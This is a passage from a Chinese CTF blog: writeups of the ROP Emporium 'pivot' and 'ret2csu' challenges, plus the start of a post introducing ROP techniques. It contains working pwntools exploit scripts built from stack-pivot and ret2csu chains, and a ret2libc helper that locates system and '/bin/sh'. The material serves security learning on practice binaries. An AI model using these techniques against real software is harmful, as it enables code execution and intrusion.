<h2 id="函数-5"><a href="#函数-5" class="headerlink" title="函数"></a>函数</h2><h3 id="main函数-5"><a href="#main函数-5" class="headerlink" title="main函数"></a>main函数</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *ptr; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  setvbuf(_bss_start, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;pivot by ROP Emporium&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;x86_64\n&quot;</span>);</span><br><span class="line">  ptr = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(<span class="number">0x1000000</span>uLL);</span><br><span class="line">  <span class="keyword">if</span> ( !ptr )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Failed to request space for pivot stack&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  pwnme(ptr + <span class="number">16776960</span>);</span><br><span class="line">  <span class="built_in">free</span>(ptr);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;\nExiting&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>主函数给我们申请的一个堆段，什么用我们暂且蒙古，多半是写入一段能get shell的汇编指令。</p>
<h3 id="pwnme函数-4"><a href="#pwnme函数-4" class="headerlink" title="pwnme函数"></a>pwnme函数</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __fastcall <span class="title">pwnme</span><span class="params">(<span class="keyword">void</span> *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s[<span class="number">32</span>]; <span class="comment">// [rsp+10h] [rbp-20h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="keyword">sizeof</span>(s));</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Call ret2win() from libpivot&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;The Old Gods kindly bestow upon you a place to pivot: %p\n&quot;</span>, a1);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Send a ROP chain now and it will land there&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;&gt; &quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, a1, <span class="number">0x100</span>uLL);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Thank you!\n&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Now please send your stack smash&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;&gt; &quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, s, <span class="number">0x40</span>uLL);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Thank you!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>发现包含一个栈溢出漏洞，但太小了，能让我们构造的栈只有0x18个长度。根据题目，我们可知这题是个栈迁移题目。那么上面的堆段的用处应该是让我们写入一段指令达到栈迁移的效果。</p>
<h3 id="uselessFunction函数"><a href="#uselessFunction函数" class="headerlink" title="uselessFunction函数"></a>uselessFunction函数</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __noreturn <span class="title">uselessFunction</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  foothold_function();</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>根据提示，找到foothold_function()，这是个外联函数，外联库自然是我们下载的另一个.so文件。</p>
<h3 id="foothold-function函数"><a href="#foothold-function函数" class="headerlink" title="foothold_function函数"></a>foothold_function函数</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">foothold_function</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;foothold_function(): Check out my .got.plt entry to gain a foothold into libpivot&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>根据pwnme的提示，我们继续在库中找到ret2win()函数。</p>
<h3 id="ret2win函数"><a href="#ret2win函数" class="headerlink" title="ret2win函数"></a>ret2win函数</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __noreturn <span class="title">ret2win</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  FILE *stream; <span class="comment">// [rsp+8h] [rbp-38h]</span></span><br><span class="line">  <span class="keyword">char</span> s[<span class="number">40</span>]; <span class="comment">// [rsp+10h] [rbp-30h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v2; <span class="comment">// [rsp+38h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  stream = fopen(<span class="string">&quot;flag.txt&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !stream )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Failed to open file: flag.txt&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  fgets(s, <span class="number">33</span>, stream);</span><br><span class="line">  <span class="built_in">puts</span>(s);</span><br><span class="line">  fclose(stream);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这是一个后门函数，根据题目中的提示，最后我们能调用此函数即可。</p>
<p>那么我们的初步思路就差不多构造好了：在pwnme函数中利用栈溢出，返回到malloc申请的堆段，然后执行堆段的代码实现栈迁移既更改rsp和rbp，迁移到后门函数所在的内存段拿到flag。</p>
<p>但是看了别人的writeup后，解题过程实际上是我们先后将rsp和rbp进行了更改。在第一次输入中，我们构造rop链利用foothold_function()将rbp更改为此函数的地址，然后再根据偏移量将rax改为后门函数的指针，最后调用rax即可。在第二次输入中，我们改了rsp使其保存申请的堆空间的地址。</p>
<h2 id="exp-5"><a href="#exp-5" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># context.log_level=&#x27;debug&#x27;</span></span><br><span class="line">sh=process(<span class="string">&#x27;./pivot&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;./libpivot.so&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./pivot&#x27;</span>)</span><br><span class="line"></span><br><span class="line">pop_rax_ret=<span class="number">0x04009bb</span></span><br><span class="line">xchg_rax_rsp_ret=<span class="number">0x04009bd</span></span><br><span class="line">pop_rbp_ret=<span class="number">0x04007c8</span></span><br><span class="line">mov_rax_rax_ret=<span class="number">0x04009c0</span></span><br><span class="line">call_rax=<span class="number">0x04006b0</span></span><br><span class="line">add_rax_rbp=<span class="number">0x04009c4</span></span><br><span class="line"></span><br><span class="line">puts_plt=elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_got=elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">main=elf.symbols[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">foothold_func_plt=elf.plt[<span class="string">&#x27;foothold_function&#x27;</span>]</span><br><span class="line">foothold_func_got=elf.got[<span class="string">&#x27;foothold_function&#x27;</span>]</span><br><span class="line"></span><br><span class="line">offset=libc.symbols[<span class="string">&#x27;ret2win&#x27;</span>]-libc.symbols[<span class="string">&#x27;foothold_function&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># print hex(offset)</span></span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">&quot;The Old Gods kindly bestow upon you a place to pivot:&quot;</span>)</span><br><span class="line">a1_adr=<span class="built_in">int</span>(sh.recv(<span class="number">16</span>),<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># print hex(a1_adr)</span></span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line">payload=p64(foothold_func_plt)</span><br><span class="line">payload+=p64(pop_rax_ret)+p64(foothold_func_got)</span><br><span class="line">payload+=p64(mov_rax_rax_ret)</span><br><span class="line">payload+=p64(pop_rbp_ret)+p64(offset)</span><br><span class="line">payload+=p64(add_rax_rbp)</span><br><span class="line">payload+=p64(call_rax)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*<span class="number">0x28</span>+p64(pop_rax_ret)+p64(a1_adr)+p64(xchg_rax_rsp_ret)</span><br><span class="line"><span class="comment"># gdb.attach(sh)</span></span><br><span class="line"><span class="comment"># raw_input()</span></span><br><span class="line">sh.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> sh.recv()</span><br></pre></td></tr></table></figure>

<p>说实话，不看别人的writeup我断然是解不了这题的，构造rop链的脑洞很大，利用起gadget也是毫不手软，胆子大。</p>
<h2 id="做题时到疑问"><a href="#做题时到疑问" class="headerlink" title="做题时到疑问"></a>做题时到疑问</h2><p>我在第二次输入中并没有在最后的ret覆盖这个堆空间指针，为什么我们在执行完对rsp的操作后会执行我们构造的rop链呢？然后我就用gdb进行了一次调试，并在第二次输入前停止。</p>
<p>输入前：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0x7ffd40ae5458: 0x000000000040099b # rsp  0x00007ffd40ae5590</span><br><span class="line">0x7ffd40ae5468: 0x00007f20af91af10        0x0000000000000000</span><br><span class="line">0x7ffd40ae5478: 0x0000000000000000        0x0000000000000000</span><br><span class="line">0x7ffd40ae5488: 0x0000000000000000        0x00007ffd40ae54b0 # rbp</span><br><span class="line">0x7ffd40ae5498: 0x00000000004008cc        0x00007f20af91af10</span><br><span class="line">0x7ffd40ae54a8: 0x00007f20ae91b010        0x00000000004009d0</span><br></pre></td></tr></table></figure>

<p>输入后：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0x7ffd40ae5460: 0x00007ffd40ae5590 # rsp  0x00007f20af91af10</span><br><span class="line">0x7ffd40ae5470: 0x6161616161616161        0x6161616161616161</span><br><span class="line">0x7ffd40ae5480: 0x6161616161616161        0x6161616161616161</span><br><span class="line">0x7ffd40ae5490: 0x6161616161616161 # rbp  0x00000000004009bb</span><br><span class="line">0x7ffd40ae54a0: 0x00007f20af91af10        0x00000000004009bd</span><br><span class="line">0x7ffd40ae54b0: 0x00000000004009d0</span><br></pre></td></tr></table></figure>

<p>发现执行完操作后我们接下来会执行0x4009D0，那么是否是这个0x4009D0的问题，我先做个实验。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0x7ffd40ae5460: 0x00007ffd40ae5590 # rsp  0x00007f20af91af10</span><br><span class="line">0x7ffd40ae5470: 0x6161616161616161        0x6161616161616161</span><br><span class="line">0x7ffd40ae5480: 0x6161616161616161        0x6161616161616161</span><br><span class="line">0x7ffd40ae5490: 0x6161616161616161 # rbp  0x00000000004009bb</span><br><span class="line">0x7ffd40ae54a0: 0x00007f20af91af10        0x00000000004009bd</span><br><span class="line">0x7ffd40ae54b0: 0x00007f20af91af10</span><br></pre></td></tr></table></figure>

<p>先将0x4009D0改为堆空间指针，然后继续运行程序，确实是拿到了flag，所以的确是这个0x4009D0特殊。所以我们来查看一下其对应的代码。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">……</span><br><span class="line">.text:00000000004009D0                 push    r15</span><br><span class="line">.text:00000000004009D2                 push    r14</span><br><span class="line">.text:00000000004009D4                 mov     r15, rdx</span><br><span class="line">.text:00000000004009D7                 push    r13</span><br><span class="line">.text:00000000004009D9                 push    r12</span><br><span class="line">.text:00000000004009DB                 lea     r12, __frame_dummy_init_array_entry</span><br><span class="line">.text:00000000004009E2                 push    rbp</span><br><span class="line">.text:00000000004009E3                 lea     rbp, __do_global_dtors_aux_fini_array_entry</span><br><span class="line">.text:00000000004009EA                 push    rbx</span><br><span class="line">.text:00000000004009EB                 mov     r13d, edi</span><br><span class="line">.text:00000000004009EE                 mov     r14, rsi</span><br><span class="line">.text:00000000004009F1                 sub     rbp, r12</span><br><span class="line">.text:00000000004009F4                 sub     rsp, 8</span><br><span class="line">.text:00000000004009F8                 sar     rbp, 3</span><br><span class="line">.text:00000000004009FC                 call    _init_proc</span><br><span class="line">……</span><br></pre></td></tr></table></figure>

<p>期间并没有对rax进行过更改，然后回调用_init_proc，</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">……</span><br><span class="line">.init:00000000004006A0                 public _init_proc</span><br><span class="line">.init:00000000004006A0 _init_proc      proc near               ; CODE XREF: __libc_csu_init+2C↓p</span><br><span class="line">.init:00000000004006A0                                         ; DATA XREF: LOAD:0000000000400458↑o</span><br><span class="line">.init:00000000004006A0                 sub     rsp, 8          ; _init</span><br><span class="line">.init:00000000004006A4                 mov     rax, cs:__gmon_start___ptr</span><br><span class="line">.init:00000000004006AB                 test    rax, rax</span><br><span class="line">.init:00000000004006AE                 jz      short loc_4006B2</span><br><span class="line">.init:00000000004006B0                 call    rax ; __gmon_start__</span><br><span class="line">……</span><br></pre></td></tr></table></figure>

<p>然后会调用rax保存的地址段，此时的rax保存的是我们构造的rop链。</p>
<p>我不知道这样解释对不对，也许是正确的。</p>
<h1 id="ret2csu"><a href="#ret2csu" class="headerlink" title="ret2csu"></a>ret2csu</h1><h2 id="函数-6"><a href="#函数-6" class="headerlink" title="函数"></a>函数</h2><h3 id="main函数-6"><a href="#main函数-6" class="headerlink" title="main函数"></a>main函数</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  pwnme(*(__int64 *)&amp;argc, (__int64)argv, (__int64)envp);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="pwnme函数-5"><a href="#pwnme函数-5" class="headerlink" title="pwnme函数"></a>pwnme函数</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">pwnme</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s[<span class="number">32</span>]; <span class="comment">// [rsp+0h] [rbp-20h] BYREF</span></span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;ret2csu by ROP Emporium&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;x86_64\n&quot;</span>);</span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="keyword">sizeof</span>(s));</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Check out https://ropemporium.com/challenge/ret2csu.html for information on how to solve this challenge.\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;&gt; &quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, s, <span class="number">0x200</span>uLL);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Thank you!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="usefulFunction函数-2"><a href="#usefulFunction函数-2" class="headerlink" title="usefulFunction函数"></a>usefulFunction函数</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function">__int64 <span class="title">usefulFunction</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> ret2win(<span class="number">1LL</span>, <span class="number">2LL</span>, <span class="number">3LL</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="ret2win函数-1"><a href="#ret2win函数-1" class="headerlink" title="ret2win函数"></a>ret2win函数</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __fastcall __noreturn <span class="title">ret2win</span><span class="params">(__int64 a1, __int64 a2, __int64 a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  FILE *stream; <span class="comment">// [rsp+20h] [rbp-10h]</span></span><br><span class="line">  FILE *streama; <span class="comment">// [rsp+20h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+2Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( a1 == <span class="number">0xDEADBEEFDEADBEEF</span>LL &amp;&amp; a2 == <span class="number">0xCAFEBABECAFEBABE</span>LL &amp;&amp; a3 == <span class="number">0xD00DF00DD00DF00D</span>LL )</span><br><span class="line">  &#123;</span><br><span class="line">    stream = fopen(<span class="string">&quot;encrypted_flag.dat&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( !stream )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Failed to open encrypted_flag.dat&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    g_buf = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(<span class="number">0x21</span>uLL);</span><br><span class="line">    <span class="keyword">if</span> ( !g_buf )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Could not allocate memory&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    g_buf = fgets(g_buf, <span class="number">33</span>, stream);</span><br><span class="line">    fclose(stream);</span><br><span class="line">    streama = fopen(<span class="string">&quot;key.dat&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( !streama )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Failed to open key.dat&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">31</span>; ++i )</span><br><span class="line">      g_buf[i] ^= fgetc(streama);</span><br><span class="line">    *(_QWORD *)(g_buf + <span class="number">4</span>) ^= <span class="number">0xDEADBEEFDEADBEEF</span>LL;</span><br><span class="line">    *(_QWORD *)(g_buf + <span class="number">12</span>) ^= <span class="number">0xCAFEBABECAFEBABE</span>LL;</span><br><span class="line">    *(_QWORD *)(g_buf + <span class="number">20</span>) ^= <span class="number">0xD00DF00DD00DF00D</span>LL;</span><br><span class="line">    <span class="built_in">puts</span>(g_buf);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Incorrect parameters&quot;</span>);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们可以看到pwnme函数中存在栈溢出漏洞，我们调用ret2win即可拿到flag。</p>
<p>但是ret2win对参数有要求，并且要变更的寄存器有rdx，所以要使用通用gadget。</p>
<p>调用通用gadget时我们正常操作，由于通用gadget只能更改edi，所以我们在后面还得再执行一次pop_rdi，之后会遇到一个 call r12+1bx*8 。这是我的知识盲区了，按照网上别人的方法，我们可以利用_fini，用gdb查看动态变量来得到其指针然后赋值给r12，rbx赋值为0。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; disass _fini</span><br><span class="line">Dump of assembler code for function _fini:</span><br><span class="line">   0x00000000004006b4 &lt;+0&gt;: sub    rsp,0x8</span><br><span class="line">   0x00000000004006b8 &lt;+4&gt;: add    rsp,0x8</span><br><span class="line">   0x00000000004006bc &lt;+8&gt;: ret    </span><br><span class="line">End of assembler dump.</span><br><span class="line">……</span><br><span class="line">pwndbg&gt; x/10g &amp;_DYNAMIC</span><br><span class="line">0x600e00: 0x0000000000000001  0x0000000000000001</span><br><span class="line">0x600e10: 0x0000000000000001  0x0000000000000038</span><br><span class="line">0x600e20: 0x000000000000001d  0x0000000000000078</span><br><span class="line">0x600e30: 0x000000000000000c  0x00000000004004d0</span><br><span class="line">0x600e40: 0x000000000000000d  0x00000000004006b4</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>也就是0x600e48存储着_fini的地址。调用 _fini和其后续函数的操作是不会有任何影响的。</p>
<h2 id="exp-6"><a href="#exp-6" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level =<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">sh=process(<span class="string">&#x27;./ret2csu&#x27;</span>)</span><br><span class="line"></span><br><span class="line">ret2win=<span class="number">0x400510</span></span><br><span class="line">finit_adr=<span class="number">0x600e48</span></span><br><span class="line"></span><br><span class="line">ret=<span class="number">0x4004e6</span></span><br><span class="line">rop1=<span class="number">0x400680</span></span><br><span class="line">rop2=<span class="number">0x40069A</span></span><br><span class="line">pop_rdi=<span class="number">0x004006a3</span></span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*<span class="number">0x20</span>+<span class="string">&#x27;a&#x27;</span>*<span class="number">8</span></span><br><span class="line">payload+=p64(rop2)</span><br><span class="line">payload+=p64(<span class="number">0</span>)+p64(<span class="number">1</span>)+p64(finit_adr)</span><br><span class="line">payload+=p64(<span class="number">0xDEADBEEFDEADBEEF</span>)+p64(<span class="number">0xCAFEBABECAFEBABE</span>)+p64(<span class="number">0xD00DF00DD00DF00D</span>)</span><br><span class="line">payload+=p64(rop1)</span><br><span class="line">payload+=p64(<span class="number">0</span>)*<span class="number">7</span></span><br><span class="line">payload+=p64(pop_rdi)+p64(<span class="number">0xDEADBEEFDEADBEEF</span>)</span><br><span class="line">payload+=p64(ret2win)</span><br><span class="line"><span class="comment"># gdb.attach(sh)</span></span><br><span class="line"><span class="comment"># raw_input()</span></span><br><span class="line">sh.sendline(payload)</span><br><span class="line"></span><br><span class="line">sh.recv()</span><br></pre></td></tr></table></figure>

<p>写这道题时，我一度怀疑自己的gdb出问题了。同一串代码，gdb.attach()注释了就能拿到了flag，一用来调试依然会出错。</p>
]]></content>
      <tags>
        <tag>writeup</tag>
        <tag>pwn</tag>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>ROP介绍</title>
    <url>/2022/03/04/ROP%E4%BB%8B%E7%BB%8D/</url>
    <content><![CDATA[<p>简单介绍以下ROP攻击，主要以CTF WIki上的内容为骨架。</p>
<span id="more"></span>

<h2 id="ROP"><a href="#ROP" class="headerlink" title="ROP"></a>ROP</h2><p>Return-oriented Programming(面向返回的编程)，也是我们常见的利用栈溢出漏洞的攻击方法。</p>
<h3 id="核心思想"><a href="#核心思想" class="headerlink" title="核心思想"></a>核心思想</h3><p>当我们能控制程序流程时，我们会使用一些程序中可以利用的指令片段(称之为gadget)，这些指令片段均已<code>ret</code> 结尾。通过这些gadget的执行和跳转达到我们想要的结果，最终get shell。</p>
<p>如何使用ROP，我也根据CTF Wiki来总结一下，但由于个人水平有限，仅记录一下基本和部分中级ROP。做题可以使用<a href="https://ropemporium.com/">ROP Emporium</a>上的题目，附上我以前写的<a href="http://110.42.161.158/2021/12/24/ROP-Emporium-64%E4%BD%8D/">ROP Emporium (64位)-writeup</a>。</p>
<h3 id="基本ROP"><a href="#基本ROP" class="headerlink" title="基本ROP"></a>基本ROP</h3><p>主要是一些攻击思维，操作根据实际搭配使用。</p>
<h4 id="ret2text"><a href="#ret2text" class="headerlink" title="ret2text"></a>ret2text</h4><p>程序保存在文件的文本段(.text)，而ret2text就是利用程序中已有的代码来进行攻击。如果我们知道敏感函数的地址，我们就可以利用栈溢出漏洞和gadget，来控制程序执行该函数。</p>
<h4 id="ret2shellcode"><a href="#ret2shellcode" class="headerlink" title="ret2shellcode"></a>ret2shellcode</h4><p>控制程序执行shellcode代码，<strong>一般来说，shellcode 需要我们自己填充。这其实是另外一种典型的利用方法，即此时我们需要自己去填充一些可执行的代码</strong>。但是必须的是，我们写入shellcode的地址需要可执行权限。</p>
<h4 id="ret2libc"><a href="#ret2libc" class="headerlink" title="ret2libc"></a>ret2libc</h4><p>控制程序执行动态链接的libc中的函数，通常是利用栈溢出，改写return address为某个函数的plt表地址，或者函数的具体位置(存储在got表中)。并且由于常用来get shell的system函数一般不会用在程序中，所以利用其他函数泄露libc版本成为经常要做的操作。需要注意的是，动态链接具有<strong>延迟绑定机制</strong>，即需要函数执行过一次，got表中才会有该函数的地址。</p>
<p>这里我放上自己的ret2libc.sublime-snippet，方便做题使用。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&lt;snippet&gt;</span><br><span class="line">	&lt;content&gt;&lt;![CDATA[</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ret2libc</span>(<span class="params">func,func_addr,module=<span class="number">1</span>,one_gadget_addr=<span class="number">0</span></span>):</span></span><br><span class="line">    <span class="keyword">if</span> module:</span><br><span class="line">        <span class="comment"># libc=ELF(libc_file)</span></span><br><span class="line">        libc=elf.libc</span><br><span class="line">        libc_base=func_addr-libc.sym[func]</span><br><span class="line">        sys_addr=libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">        binsh=libc_base+libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>).<span class="built_in">next</span>()</span><br><span class="line">        environ=libc_base+libc.sym[<span class="string">&#x27;__environ&#x27;</span>]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">    	<span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">    	libc=LibcSearcher(func,func_addr)</span><br><span class="line">    	libc_base=func_addr-libc.dump(func)</span><br><span class="line">        sys_addr=libc_base+libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">        binsh=libc_base+libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> &#123;<span class="string">&#x27;libc_base&#x27;</span>:libc_base,<span class="string">&#x27;system&#x27;</span>:sys_addr,<span class="string">&#x27;binsh&#x27;</span>:binsh,<span class="string">&#x27;environ&#x27;</span>:environ&#125;</span><br><span class="line"></span><br><span class="line">libc=ret2libc($&#123;<span class="number">1</span>:func&#125;,$&#123;<span class="number">2</span>:func_addr&#125;)</span><br><span class="line">]]&gt;&lt;/content&gt;</span><br><span class="line">	&lt;!-- <span class="type">Optional</span>: <span class="type">Set</span> a tabTrigger to define how to trigger the snippet --&gt;</span><br><span class="line">	&lt;tabTrigger&gt;ret2libc&lt;/tabTrigger&gt;</span><br><span class="line">	&lt;!-- <span class="type">Optional</span>: <span class="type">Set</span> a scope to limit where the snippet will trigger --&gt;</span><br><span class="line">	&lt;!-- &lt;scope&gt;source.python&lt;/scope&gt; --&gt;</span><br><span class="line">&lt;/snippet&gt;</span><br></pre></td></tr></table></figure>

<p>其中使用了pwnlib.elf模块。默认使用了本地的libc文件，如果使用的是下载的libc文件就把注释取消了将libc_file替换为文件路径即可。</p>
<h4 id="ret2syscall"><a href="#ret2syscall" class="headerlink" title="ret2syscall"></a>ret2syscall</h4><p>类似于ret2libc，不同是控制程序执行系统调用函数来get shell或泄露敏感文件内容，常需要构造rop chain或写入shellcode来使用。系统调用不了解可以看看这篇<a href="http://110.42.161.158/2022/03/04/%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8%E4%BB%8B%E7%BB%8D/">文章</a>。</p>
<h3 id="中级ROP"><a href="#中级ROP" class="headerlink" title="中级ROP"></a>中级ROP</h3><h4 id="ret2csu"><a href="#ret2csu" class="headerlink" title="ret2csu"></a>ret2csu</h4><p>主要攻击方式以基本ROP为主，ret2csu的作用体现在对寄存器赋值上，个人觉得和高级ROP中的SROP功能差不多。原理是基于<code>__libc_csu_init</code> 中的 gadgets：</p>
